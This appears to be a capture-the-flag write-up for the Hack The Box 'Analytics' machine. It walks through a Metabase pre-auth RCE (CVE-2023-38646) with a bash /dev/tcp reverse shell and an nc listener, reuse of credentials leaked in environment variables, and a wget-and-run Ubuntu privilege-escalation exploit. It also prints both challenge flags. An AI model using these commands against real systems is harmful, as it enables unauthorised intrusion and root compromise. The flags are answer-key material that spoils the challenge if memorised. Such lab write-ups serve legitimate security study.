![Analytics.png](./img/Analytics.png)
# Initial Reconnaissance
1. `curl -I 10.10.11.224` to find a possible location / DNS name
2. get a result of `analytical.htb`, add to `/etc/hosts`
3. login page lead to another DNS named `data.analytical.htb`, add to `/etc/hosts`
4. login page uses metabase
5. nothing interesting

# User Escalation
1. found RCE metabase (CVE-2023-38646) POC `https://github.com/m3m0o/metabase-pre-auth-rce-poc`
2. setup nc listener `nc -lvnp 9090`
3. get the setup-token from `/api/session/properties`
4. run the POC script `python main.py -t http://data.analytical.htb -t setup-token -c "bash -i >& /dev/tcp/my-ip/9090 0>&1"`\
note: to get your IP, `ifconfig` look for `tun` connection should be 10.10.x.y
5. get a connection in the nc listener
6. looks like i'm inside a container, check for environment variables `env`
7. exposed a credentials `metalytics:An4lytics_ds20223#`
8. ssh into the machine `ssh metalytics@10.10.11.224`, then enter the password, if fingerprint thing is asked, just `yes`
9.  once logged in, do `ls`, notice a list of file
10. `cat user.txt`
11. flag: `d79087ca55465b0f50a125b4491f26b2`

# Further Reconnaissance
1. `sudo -l` to check any available sudo command, return nothing
2. `ls /usr/bin` to find interesting binary to be exploited, found nothing interesting
3. `uname -rs` or `uname -a` find the kernel and OS version, return an Ubuntu with linux kernel 6.2.0-25

# Privilege Escalation
1. there's been a recent discovery of ubuntu privesc CVE-2023-2640 an CVE-2023-32629
2. found the POC `https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629`
3. clone the repositories, change to the repositories directory, i need to send it into the target machine
4. setup a simple http server on the repositories directory `python -m http.server`, open a http server with port 8000
5. on the target machine, create a directory `mkdir /tmp/random_name` then move to the `/tmp/random_name` directory (unwritten rules, value others by not giving the exploit or making a mess to the challenges)
6. download the file from my machine `wget my-ip:8000/exploit.sh`
7. exploit should be just a file, make it executable `chmod +x exploit.sh`
8. `./exploit.sh`, to run the exploit
9. notice that the name have been changed from `metalytics` to `root` or read the prompt in the terminal after running the script
10. `cat /root/root.txt`
11. flag: `e4a9094067381779986ebcfe49ba7873`

![Analytics-Pwned.png](./img/Analytics-Pwned.png)
